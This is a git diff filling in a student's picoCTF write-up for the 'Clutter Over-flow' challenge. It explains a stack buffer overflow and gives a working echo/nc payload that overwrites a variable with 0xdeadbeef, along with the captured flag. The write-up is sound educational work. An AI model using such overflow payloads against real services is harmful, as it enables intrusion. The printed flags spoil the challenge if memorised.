@@ -88,37 +88,63 @@ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
 
 # 3. Clutter Over-flow
 
-> Put in the challenge's description here
+> Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890
 
 ## Solution:
-
-- Include as many steps as you can with your thought process
-- You **must** include images such as screenshots wherever relevant.
-
+- I read the source code and found out that the code variable was being compared to the "GOAL", hex value 0xdeadbeef.
+- On further understanding the code, I realised that I was typing out the code variable after 256+8 characters of input.
+- Since the size of the input variable was set to 256, doing trial and error after that made me realise the above.
+- After finding this out, I had to print the hex value of GOAL in the string. This could be done through escape sequences.
+- I then ran the following code and got the flag.
+  
 ```
-put codes & terminal outputs here using triple backticks
-
-you may also use ```python for python codes for example
+echo -e 'hruudmmchxkearjpcbctzmnqihawizabapehwhfamvvbcqttwhdzjptzdztbfffrwwctcypyhrkkegkmpftmvrtxcviydufwibbdhycwgcheifvqdxtruudctpxykubrjjaezaehacwketpnzitwrtnactnxvwtagvidpxdrndtxzuieckdkedhunnpqytkexcpamnrpbzqygfinwxqdifkgbubytpffnarujfamzekkabtqdjnrnznqheufdyrkqwertyui\xef\xbe\xad\xde' | nc mars.picoctf.net 31890
+ ______________________________________________________________________
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
+|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
+| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
+|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
+| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
+|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
+| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
+|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
+.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
+|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
+| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
+|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
+|\|______|===============|________________|/|""""""""""""""""""""""""""
+" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
+""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
+""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+My room is so cluttered...
+What do you see?
+code == 0xdeadbeef: how did that happen??
+take a flag for your troubles
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
+sid@sidsAsusZenbook:~/cryptoTP$ 
 ```
 
 ## Flag:
 
 ```
-picoCTF{}
+picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
 ```
 
 ## Concepts learnt:
 
-- Include the new topics you've come across and explain them in brief
-- 
-
+- Escape sequences for hex characters
+- Buffer lengths
+- echo usage, `echo -e` considers escape sequences\
+- For hex `0xdeadbeef`, the byte-sequence is `\xef\xbe\xad\xde`
+  
 ## Notes:
 
-- Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found.
-- 
+- A major pain point was on figuring out how to enter the escape sequences rather than figuring out the length of the buffer.
 
 ## Resources:
 
-- Include the resources you've referred to with links. [example hyperlink](https://google.com)
-- 
+- Got a string of 256 characters [here](https://pinetools.com/random-string-generator) instead of typing it out.
+- Learnt a bit about buffer functions [here.](https://www.tutorialspoint.com/c_standard_library/c_function_setbuf.htm)
 
